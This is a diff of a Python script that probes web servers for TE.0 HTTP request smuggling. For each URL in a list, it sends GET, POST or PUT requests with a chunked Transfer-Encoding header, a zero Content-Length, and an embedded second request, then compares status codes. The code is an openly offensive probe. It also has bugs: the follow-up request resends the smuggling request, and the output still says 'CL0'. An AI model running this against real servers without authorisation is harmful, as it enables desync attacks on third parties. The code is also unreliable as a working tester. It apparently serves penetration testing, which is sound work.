@@ -1,61 +1,59 @@
-#! /usr/bin/env python3
-import sys
-import requests
-#import urllib.parse as urlparse
+from requests import Request, Session
 import argparse
 from urllib.parse import urlparse as parse
-import logging
-requests.packages.urllib3.disable_warnings()
-
-#Try TE0
-#Requests que generan Redirects + Recursos estaticos (GETs) + Generar errores para forzar el no procesamiento de un Content-Length
-#Add H2.0
-#GET requests con tecnicas de ofuscacion del CL (Regilero + ReqSmuggler)
-#Transfer-Encoding: chunked
-
-#2c
-#GET /resources/images/blog.svg HTTP/1.1
-#Foo: Bar
-
 
 #try:
 #    from http.client import HTTPConnection
 #except ImportError:
 #    from httplib import HTTPConnection
-#HTTPConnection.debuglevel = 1
+#HTTPConnection.debuglevel = 2
 
 parser = argparse.ArgumentParser()
-#parser.add_argument('-t','--target', help='host/ip to target', required=True)
 parser.add_argument('-u','--urlFile', help='file with urls to test from specific host', required=True)
 args = parser.parse_args()
-
-#CL0Host = args.target.strip()
-URLFilePath = args.urlFile.strip()
-
-#Session config
 proxies = {'http': '127.0.0.1:8080','https': '127.0.0.1:8080'}
-session = requests.Session()
-#session.proxies = proxies
-session.allow_redirects = False
-session.stream = True
+
+URLFilePath = args.urlFile.strip()
+session = Session()
 
 URLs = open(URLFilePath, "r")
 for url in URLs:
-    CandidateMethod = url.split("-")[1]
-    FullUrl = parse(url.split("-")[0])
-    NormalRespCode = url.split("-")[2]
-    CL0Scheme = FullUrl.scheme
-    CL0Host = FullUrl.netloc
-    CL0TestPath = FullUrl.path
-    CL0ResultPath = FullUrl.path
-    CL0TestBody = 'GET /thisPageDoesNotExist HTTP/1.1\r\nFoo: Bar'
+    CandidateMethod = url.split("---")[1]
+    FullUrl = parse(url.split("---")[0])
+    NormalRespCode = url.split("---")[2]
+    TE0Scheme = FullUrl.scheme
+    TE0Host = FullUrl.netloc
+    TE0TestPath = FullUrl.path
+    TE0ResultPath = FullUrl.path
+    TE0TestBody = '2c\r\nGET /thisPageDoesNotExist HTTP/1.1\r\nFoo: Bar\r\n0\r\n\r\n'
     if(CandidateMethod == 'GET'):#We send the second get always, as the same request can appear several times with different methods
-        CL0Test = session.get(CL0Scheme + "://" + CL0Host + CL0TestPath, data=CL0TestBody, allow_redirects=False)
-        CL0Result = session.get(CL0Scheme + "://" + CL0Host + CL0ResultPath, allow_redirects=False)
+        TE0TestPrepReq = Request('GET', TE0Scheme + "://" + TE0Host + TE0TestPath, data=TE0TestBody)
+        TE0ResultPrepReq = Request('GET', TE0Scheme + "://" + TE0Host + TE0TestPath)
+        TE0TestPrep = TE0TestPrepReq.prepare()
+        TE0ResultPrep = TE0ResultPrepReq.prepare()
+        TE0TestPrep.headers['content-length'] = 0 #Needed to full server that request is chunked
+        TE0TestPrep.headers['Transfer-Encoding'] = 'chunked'
+        TE0TestPrep.headers['Connection'] = 'keep-alive'
+        TE0Test = session.send(TE0TestPrep,stream=True)
+        TE0Result = session.send(TE0TestPrep,stream=True)
     elif(CandidateMethod == 'POST'):
-        CL0Test = session.post(CL0Scheme + "://" + CL0Host + CL0TestPath, data=CL0TestBody, allow_redirects=False)
-        CL0Result = session.get(CL0Scheme + "://" + CL0Host + CL0ResultPath, allow_redirects=False)
+        TE0TestPrepReq = Request('POST', TE0Scheme + "://" + TE0Host + TE0TestPath, data=TE0TestBody)
+        TE0ResultPrepReq = Request('POST', TE0Scheme + "://" + TE0Host + TE0TestPath)
+        TE0TestPrep = TE0TestPrepReq.prepare()
+        TE0ResultPrep = TE0ResultPrepReq.prepare()
+        TE0TestPrep.headers['content-length'] = 0 #Needed to full server that request is chunked
+        TE0TestPrep.headers['Transfer-Encoding'] = 'chunked'
+        TE0TestPrep.headers['Connection'] = 'keep-alive'
+        TE0Test = session.send(TE0TestPrep,stream=True)
+        TE0Result = session.send(TE0TestPrep,stream=True)
     else: #PUT
-        CL0Test = session.put(CL0Scheme + "://" + CL0Host + CL0TestPath, data=CL0TestBody, allow_redirects=False)
-        CL0Result = session.get(CL0Scheme + "://" + CL0Host + CL0ResultPath, allow_redirects=False)
-    print("[%s] - The response code for %s is %s and after CL0 is %s for method %s" % (NormalRespCode,CL0TestPath,str(CL0Test.status_code),str(CL0Result.status_code),CandidateMethod))
+        TE0TestPrepReq = Request('PUT', TE0Scheme + "://" + TE0Host + TE0TestPath, data=TE0TestBody)
+        TE0ResultPrepReq = Request('PUT', TE0Scheme + "://" + TE0Host + TE0TestPath)
+        TE0TestPrep = TE0TestPrepReq.prepare()
+        TE0ResultPrep = TE0ResultPrepReq.prepare()
+        TE0TestPrep.headers['content-length'] = 0 #Needed to full server that request is chunked
+        TE0TestPrep.headers['Transfer-Encoding'] = 'chunked'
+        TE0TestPrep.headers['Connection'] = 'keep-alive'
+        TE0Test = session.send(TE0TestPrep,stream=True)
+        TE0Result = session.send(TE0TestPrep,stream=True)
+    print("[%s] - The response code for %s is %s and after CL0 is %s for method %s" % (NormalRespCode,TE0TestPath,str(TE0Test.status_code),str(TE0Result.status_code),CandidateMethod))
